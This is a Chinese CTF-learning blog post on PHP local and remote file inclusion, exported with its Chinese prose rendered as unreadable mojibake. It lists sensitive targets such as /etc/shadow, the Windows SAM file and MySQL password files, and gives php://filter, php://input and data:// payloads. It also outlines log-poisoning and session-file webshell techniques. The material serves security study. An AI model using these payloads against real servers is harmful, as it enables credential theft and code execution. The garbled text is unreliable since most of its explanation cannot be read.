<li>includeåªç”Ÿæˆè­¦å‘Šï¼ˆE_WARNINGï¼‰å¹¶ä¸”è„šæœ¬ä¼šç»§ç»­<br>&emsp;&emsp;å› æ­¤ï¼Œå¦‚æœå¸Œæœ›ç»§ç»­æ‰§è¡Œï¼Œå¹¶å‘ç”¨æˆ·è¾“å‡ºç»“æœï¼Œå³ä½¿åŒ…å«æ–‡ä»¶å·²ä¸¢å¤±ï¼Œé‚£ä¹ˆè¯·ä½¿ç”¨ includeã€‚å¦åˆ™ï¼Œåœ¨æ¡†æ¶ã€CMS æˆ–è€…å¤æ‚çš„PHP åº”ç”¨ç¨‹åºç¼–ç¨‹ä¸­ï¼Œè¯·å§‹ç»ˆä½¿ç”¨ reguire å‘æ‰§è¡Œæµç”¨å…³é”®æ–‡ä»¶ã€‚è¿™åœ¨æŸä¸ªå…³é”®æ–‡ä»¶æ„å¤–ä¸¢å¤±çš„æƒ…å†µä¸‹,æœ‰åŠ©äºæé«˜åº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§å’Œå®Œæ•´æ€§ã€‚<br>&emsp;&emsp;åƒæ˜¯è¿™æ ·çš„æ–‡ä»¶åŒ…å«å‡½æ•°è¿˜æœ‰  <figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">include_once</span><br><span class="line">require_once</span><br><span class="line">highlight_file</span><br><span class="line">show_source</span><br><span class="line"><span class="keyword">file</span></span><br><span class="line">readfile</span><br><span class="line">file_get_contents</span><br><span class="line">file_put_contents</span><br><span class="line"><span class="keyword">fopen</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><p>&emsp;&emsp;åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬è¦çŸ¥é“ï¼Œæ–‡ä»¶åŒ…å«å‡½æ•°å¹¶ä¸åœ¨æ„è¢«åŒ…å«çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹ï¼Œåªè¦æœ‰phpä»£ç ï¼Œéƒ½ä¼šè¢«è§£æå‡ºæ¥ï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å–ä¸€ä¸‹åŒ…å«æ•æ„Ÿä¿¡æ¯çš„æ–‡ä»¶ï¼Œä¸€äº›æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´ä¹Ÿæ˜¯å› æ­¤è€Œå‡ºæ¥çš„ã€‚  </p>
<h3 id="æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆLFIï¼‰"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆLFIï¼‰" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆLFIï¼‰"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆLFIï¼‰</h3><p>&emsp;&emsp;æ—¢ç„¶includeç­‰å‡½æ•°èƒ½åŒ…å«æœ¬åœ°æ–‡ä»¶å¹¶å›æ˜¾å‡ºæ¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒå»è¯»å–ä¸€äº›æœ¬åœ°å›ºæœ‰çš„æ–‡ä»¶ï¼Œç”¨å¾—æœ€å¤šçš„æ˜¯phpinfo();<br>&emsp;&emsp;å‡ºæ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å–ä¸€äº›ç³»ç»Ÿæœ¬åœ°çš„æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚__C:\Windows\system.ini__ ,è¿™æ˜¯å±äº<strong>ç»å¯¹è·¯å¾„è¯»å–</strong>ã€‚ <strong>ç›¸å¯¹è·¯å¾„è¯»å–</strong>æ˜¯é€šè¿‡.&#x2F; è¡¨ç¤ºå½“å‰ä½ç½®è·¯å¾„ï¼Œ..&#x2F;è¡¨ç¤ºä¸Šä¸€çº§è·¯å¾„ä½ç½®ï¼ˆåœ¨Linuxä¸­åŒæ ·é€‚ç”¨ï¼‰ï¼Œä¾‹å¦‚å½“å‰é¡µé¢æ‰€åœ¨è·¯å¾„ä¸º__C:\Apache24\htdocs_<em>,æˆ‘ä»¬éœ€è¦ä½¿ç”¨..&#x2F;æ¨åˆ°Cç›˜å†è¿›è¡Œè®¿é—®ï¼Œæ„é€ è·¯å¾„å¦‚ä¸‹ï¼š</em><em>..&#x2F;..&#x2F;windows&#x2F;system.ini</em>_ åé¢çš„è·¯å¾„ç©¿è¶Šå°±æ˜¯åˆ©ç”¨çš„è¿™ä¸ªåŸç†ï¼Œç¡•ä»¥è¯´åŸºç¡€è¿˜æ˜¯æœ‰å¿…è¦å­¦ä¸€å­¦çš„ã€‚ä¹Ÿå°±æ˜¯æ‰“æ¯”èµ›æ‰¾flagçš„æ—¶å€™ï¼Œå°±ç”¨..&#x2F;..&#x2F;..&#x2F;â€¦â€¦&#x2F;flagï¼Œæ¨åˆ°flagæ‰€åœ¨çš„ç›®å½•ä½ç½®å°±å¯ä»¥äº†ã€‚<br>&emsp;&emsp;ä¸€äº›å¸¸è§çš„æ•æ„Ÿç›®å½•ä¿¡æ¯è·¯å¾„  </p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">Windowsç³»ç»Ÿï¼š  </span><br><span class="line">C:\boot.ini <span class="symbol">__</span>æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬<span class="symbol">__</span></span><br><span class="line">C:\windows\system32\inetsrv\MetaBase.xml __IISé…ç½®æ–‡ä»¶<span class="symbol">__</span></span><br><span class="line">C:\windows\repair\sam <span class="symbol">__</span>å­˜å‚¨Windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç <span class="symbol">__</span></span><br><span class="line">C:\ProgramFiles\mysql\my.ini __Mysqlé…ç½®<span class="symbol">__</span></span><br><span class="line">C:\ProgramFiles\mysql\data\mysql\user.MYD __MySQL rootå¯†ç <span class="symbol">__</span></span><br><span class="line">C:\windows\php.ini __phpé…ç½®ä¿¡æ¯<span class="symbol">__</span></span><br></pre></td></tr></table></figure>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Linux/Unixç³»ç»Ÿï¼š</span><br><span class="line"><span class="regexp">/etc/</span>password __è´¦æˆ·ä¿¡æ¯__</span><br><span class="line"><span class="regexp">/etc/</span>shadow __è´¦æˆ·å¯†ç ä¿¡æ¯__</span><br><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/app/</span>apache2<span class="regexp">/conf/</span>httpd.conf __Apache2é»˜è®¤é…ç½®æ–‡ä»¶__</span><br><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/app/</span>apache2<span class="regexp">/conf/</span>extra/httpd-vhost.conf __è™šæ‹Ÿç½‘ç«™é…ç½®__</span><br><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/app/</span>php5<span class="regexp">/lib/</span>php.ini __PHPç›¸å…³é…ç½®__</span><br><span class="line"><span class="regexp">/etc/</span>httpd<span class="regexp">/conf/</span>httpd.conf __Apacheé…ç½®æ–‡ä»¶__</span><br><span class="line"><span class="regexp">/etc/my</span>.conf __mysqlé…ç½®æ–‡ä»¶__</span><br></pre></td></tr></table></figure>

<h3 id="LFIæ¼æ´åˆ©ç”¨æŠ€å·§"><a href="#LFIæ¼æ´åˆ©ç”¨æŠ€å·§" class="headerlink" title="LFIæ¼æ´åˆ©ç”¨æŠ€å·§"></a>LFIæ¼æ´åˆ©ç”¨æŠ€å·§</h3><h4 id="é…åˆæ–‡ä»¶ä¸Šä¼ ä½¿ç”¨"><a href="#é…åˆæ–‡ä»¶ä¸Šä¼ ä½¿ç”¨" class="headerlink" title="é…åˆæ–‡ä»¶ä¸Šä¼ ä½¿ç”¨"></a>é…åˆæ–‡ä»¶ä¸Šä¼ ä½¿ç”¨</h4><p>&emsp;&emsp; å±äºæ–‡ä»¶ä¸Šä¼ äº†é‚£å°±åˆ°é‚£é‡Œå»çœ‹å§(ã£â€™-â€˜)â•®&#x3D;ÍŸÍŸÍÍğŸ’Œ  </p>
<h4 id="åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶"><a href="#åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶" class="headerlink" title="åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶"></a>åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶</h4><p>&emsp;&emsp;æœ‰äº›ç½‘ç«™å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä½†æ˜¯å´æ²¡æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡åˆ©ç”¨Apacheçš„æ—¥å¿—æ–‡ä»¶æ¥ç”Ÿæˆä¸€å¥è¯æœ¨é©¬ã€‚<font color=red>åœ¨ç”¨æˆ·å‘èµ·è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå°†è¯·æ±‚å†™å…¥access.logï¼Œå½“å‘é€é”™è¯¯æ—¶å†™å…¥error.log</font>å¯ä»¥ç”¨BPåœ¨é‡Œé¢ç¼–å†™ä¸€å¥è¯æœ¨é©¬ï¼Œåƒæ˜¯è¿™æ ·<br><img data-src="/images/access.log.png" alt="access.log">  </p>
<h4 id="åŒ…å«SESSIONæ–‡ä»¶"><a href="#åŒ…å«SESSIONæ–‡ä»¶" class="headerlink" title="åŒ…å«SESSIONæ–‡ä»¶"></a>åŒ…å«SESSIONæ–‡ä»¶</h4><p>&emsp;&emsp;è¿™ä¸ªå‡ºç°çš„ä¸å¤šï¼Œäº†è§£ä¸€ä¸‹å°±å¥½ï¼Œå°±æ˜¯æ‰¾åˆ°SESSIONæ–‡ä»¶ã€‚æ ¹æ®æ–‡ä»¶å†…å®¹æ‰¾åˆ°å¯æ§å˜é‡ï¼Œåœ¨æ„é€ payloadæ’å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œæœ€ååŒ…å«å°±å¯ä»¥äº†ã€‚<br>&emsp;&emsp;å¸¸è§çš„sessionå­˜å‚¨è·¯å¾„ï¼š</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/php/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/php/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/tmp/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/tmp/</span>sessions/sess_PHPSESSID</span><br><span class="line">sessionæ–‡ä»¶æ ¼å¼:sess_[phpsessid],è€Œphpsessidåœ¨å‘é€çš„è¯·æ±‚çš„cookieå­—æ®µä¸­</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;çœ‹ä¸ªé¢˜ç›®ï¼Œæ‡‚äº†è¯´æ˜ä½ æŒæ¡äº†<a href="https://chybeta.github.io/2017/11/09/%E4%B8%80%E9%81%93CTF%E9%A2%98%EF%BC%9APHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">SessionåŒ…å«</a>  </p>
<h4 id="åŒ…å«ä¸´æ—¶æ–‡ä»¶"><a href="#åŒ…å«ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="åŒ…å«ä¸´æ—¶æ–‡ä»¶"></a>åŒ…å«ä¸´æ—¶æ–‡ä»¶</h4><p>&emsp;&emsp;phpä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚åœ¨linuxä¸‹ä½¿ç”¨&#x2F;tmpç›®å½•ï¼Œè€Œåœ¨windowsä¸‹ä½¿ç”¨C:\windows\tempç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤å‰ï¼Œå¯ä»¥åˆ©ç”¨æ—¶é—´ç«äº‰çš„æ–¹å¼åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚  </p>
<p>&emsp;&emsp;ç”±äºåŒ…å«éœ€è¦çŸ¥é“åŒ…å«çš„æ–‡ä»¶åã€‚ä¸€ç§æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›çŒœè§£ï¼Œlinuxä¸‹ä½¿ç”¨çš„æ˜¯éšæœºå‡½æ•°æœ‰ç¼ºé™·ï¼Œè€Œwindowsä¸‹åªæœ‰65535ç§ä¸åŒçš„æ–‡ä»¶åï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ã€‚  </p>
<p>&emsp;&emsp;å¦ä¸€ç§æ–¹æ³•æ˜¯é…åˆphpinfoé¡µé¢çš„php variablesï¼Œå¯ä»¥ç›´æ¥è·å–åˆ°ä¸Šä¼ æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„å’Œä¸´æ—¶æ–‡ä»¶åï¼Œç›´æ¥åŒ…å«å³å¯ã€‚  è¯ä¸å¤šè¯´ï¼Œçœ‹é¢˜<a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/">æ—¶é—´ç«äº‰ä¸´æ—¶æ–‡ä»¶</a></p>
<h3 id="è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆRFIï¼‰"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆRFIï¼‰" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆRFIï¼‰"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆRFIï¼‰</h3><p>&emsp;&emsp;å¦‚æœPHPçš„é…ç½®é€‰é¡¹allow_url_includeã€allow_url_fopençŠ¶æ€ä¸ºONçš„è¯ï¼Œåˆ™include&#x2F;requireå‡½æ•°æ˜¯å¯ä»¥åŠ è½½è¿œç¨‹æ–‡ä»¶çš„ï¼Œè¿™ç§æ¼æ´è¢«ç§°ä¸ºè¿œç¨‹æ–‡ä»¶åŒ…å«(RFI),è¿™ä¸ªéœ€è¦è‡ªå·±æœ‰ä¸ªwebæœåŠ¡å™¨ï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•å¯ä»¥å»CSDNçœ‹çœ‹å¤§ä½¬çš„blog</p>
<h3 id="PHPä¼ªåè®®"><a href="#PHPä¼ªåè®®" class="headerlink" title="PHPä¼ªåè®®"></a>PHPä¼ªåè®®</h3><p>&emsp;&emsp;æ–‡ä»¶åŒ…å«çš„é‡ä¸­ä¹‹é‡ï¼Œæ˜¯ä¸€å®šéœ€è¦æŒæ¡çš„ã€‚å¯ä»¥è¯´ï¼Œçœ‹è§æ–‡ä»¶åŒ…å«çš„é¢˜ç›®å°±è¦æƒ³åˆ°ä¼ªåè®®ã€‚å¦‚ä¸‹  </p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">file:</span><span class="comment">// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">// â€” è®¿é—® HTTP(s) ç½‘å€</span></span><br><span class="line"><span class="symbol">ftp:</span><span class="comment">// â€” è®¿é—® FTP(s) URLs</span></span><br><span class="line"><span class="symbol">php:</span><span class="comment">// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰</span></span><br><span class="line"><span class="symbol">zlib:</span><span class="comment">// â€” å‹ç¼©æµ</span></span><br><span class="line"><span class="symbol">data:</span><span class="comment">// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰</span></span><br><span class="line"><span class="symbol">glob:</span><span class="comment">// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span></span><br><span class="line"><span class="symbol">phar:</span><span class="comment">// â€” PHP å½’æ¡£</span></span><br><span class="line"><span class="symbol">ssh2:</span><span class="comment">// â€” Secure Shell 2</span></span><br><span class="line"><span class="symbol">rar:</span><span class="comment">// â€” RAR</span></span><br><span class="line"><span class="symbol">ogg:</span><span class="comment">// â€” éŸ³é¢‘æµ</span></span><br><span class="line"><span class="symbol">expect:</span><span class="comment">// â€” å¤„ç†äº¤äº’å¼çš„æµ</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;éœ€è¦ç†Ÿç»ƒæŒæ¡çš„æœ‰  </p>
<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>&emsp;&emsp;æ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œç±»ä¼¼readfile(),file()ç­‰ï¼Œå¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ï¼ˆè¦çŸ¥é“ï¼Œé€šå¸¸æ¥è¯´ä¸ä¼šæœ‰äººç›´æ¥æŠŠæºç æ”¾å‡ºæ¥çš„ï¼Œé™¤äº†æ‰“æ¯”èµ›ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨å®ƒæ¥å®Œæˆè·å–ï¼Œphp:&#x2F;&#x2F;filteræµä¼šè¢«å½“åšphpæ–‡ä»¶æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–ã€‚<br>&emsp;&emsp;æœ€å¸¸ç”¨ä¹Ÿæ˜¯æœ€å¥½ç”¨çš„payload  </p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=flag.php</span><br><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/resource=index.php</span><br></pre></td></tr></table></figure>

<h5 id="æ‰©å±•"><a href="#æ‰©å±•" class="headerlink" title="æ‰©å±•"></a>æ‰©å±•</h5><p>&emsp;&emsp;å½“æˆ‘ä»¬æ— æ³•è¯»å–åˆ°æœ‰ç”¨ä¿¡æ¯æˆ–è€…ä¸çŸ¥é“è¯»å–å“ªä¸ªphpæ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æµå†™å…¥ä¸€å¥è¯æœ¨é©¬è¿›å»ï¼Œè¯¦æƒ…è¯·è½¬åˆ°<a href="/2024/07/14/php-filter-chain-generator/">php_filter_chain_generator</a>è„šæœ¬å‚è€ƒ</p>
<h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>&emsp;&emsp;å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ,<strong>å°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œ</strong>,å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥<strong>å°†å‚æ•°è®¾ä¸ºphp:&#x2F;&#x2F;input</strong>,åŒæ—¶<strong>postå†™å…¥æƒ³è¦æ‰§è¡Œçš„phpä»£ç </strong>ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ï¼Œä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<h4 id="data-text-plain"><a href="#data-text-plain" class="headerlink" title="data:&#x2F;&#x2F;text&#x2F;plain"></a>data:&#x2F;&#x2F;text&#x2F;plain</h4><p>&emsp;&emsp;åœ¨åé¢å†™å…¥ä½ æƒ³å†™å…¥çš„æ•°æ®ç»™å‚æ•°ï¼Œä¾‹å¦‚<strong>data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo();?></strong>,å¦‚æœå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¯ä»¥è¿›è¡Œbase64ç¼–ç ï¼Œdata:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D; è¿™ä¸ªä¸å¸¸ç”¨ï¼Œæœ‰è¿™æ¡ä»¶å¯ä»¥ç”¨php:&#x2F;&#x2F;inputï¼ˆdogeï¼‰</p>
<h3 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h3><p>&emsp;&emsp;å‰©ä¸‹çš„ä¼ªåè®®ä¸å¸¸è§ä¹Ÿä¸å¸¸è€ƒï¼ˆè‡³å°‘æˆ‘è¿˜æ²¡é‡åˆ°( Í¡Â°â¥ Í¡Â°)ï¼‰ï¼Œèƒ½å­¦åˆ°è¿™å·²ç»å¾ˆä¸é”™äº†ï¼Œé‡ç‚¹åœ¨äºå®æ“å»åšé¢˜ï¼Œä¸¤ä¸ªå­—ï¼šæ²‰æ·€ï¼Œè¿™äº›çŸ¥è¯†ç‚¹åœ¨ç½‘ä¸Šæœ‰å¾ˆå¤šèµ„æ–™éƒ½å¯ä»¥æŸ¥åˆ°ï¼Œæˆ‘å†™çš„å¾ˆå¤šéƒ½æ˜¯ç½‘ä¸Šç…§æŠ„çš„ï¼ˆ(à¸…â€¢ï¹â€¢à¸…)ï¼‰ï¼Œæˆ‘å†™åœ¨blogé‡Œä¸€æ¥æ˜¯ä¸ºäº†å¼•å¯¼å­¦ä¹ è·¯çº¿ï¼Œå†™çš„ä¸è¯¦ç»†æˆ–è€…çœ‹ä¸æ‡‚çš„åœ°æ–¹å¯ä»¥å¤åˆ¶ç›®å½•å»æœç´¢ç›¸å…³çŸ¥è¯†ç‚¹ï¼ŒäºŒæ¥å°±æ˜¯è‡ªå·±æ•´ç†çŸ¥è¯†ç‚¹ï¼ŒåŠ å¼ºå°è±¡ã€‚å¸Œæœ›å„ä½å¸ˆå‚…ä»¬èƒ½å¤Ÿåœ¨webé“è·¯ä¸Šèµ°å¾—æ›´å¿«æ›´è¿œãƒ¾(â€â•¹â—¡â•¹)ï¾‰ï¾â€~</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>æ–‡ä»¶åŒ…å«</tag>
      </tags>
  </entry>
</search>
